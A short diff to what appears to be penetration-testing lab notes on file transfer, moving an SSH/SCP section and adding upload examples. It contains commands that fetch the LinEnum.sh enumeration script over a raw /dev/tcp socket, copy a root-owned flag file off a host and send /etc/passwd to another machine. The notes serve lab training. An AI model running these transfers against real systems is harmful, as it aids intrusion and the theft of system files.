@@ -218,14 +218,6 @@ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
 cat <&3
 ```
 
-### SSH
-
-```bash
-sudo systemctl enable ssh && sudo systemctl start ssh
-
-scp plaintext@192.168.49.128:/root/myroot.txt .
-```
-
 ## Upload
 
 ### Web (443)
@@ -248,6 +240,15 @@ python3 -m http.server
 python2.7 -m SimpleHTTPServer
 php -S 0.0.0.0:8000
 ruby -run -ehttpd . -p8000
-
 ```
 
+## SSH (SCP)
+
+```bash
+sudo systemctl enable ssh && sudo systemctl start ssh
+
+# download
+scp plaintext@192.168.49.128:/root/myroot.txt .
+# upload
+scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
+```
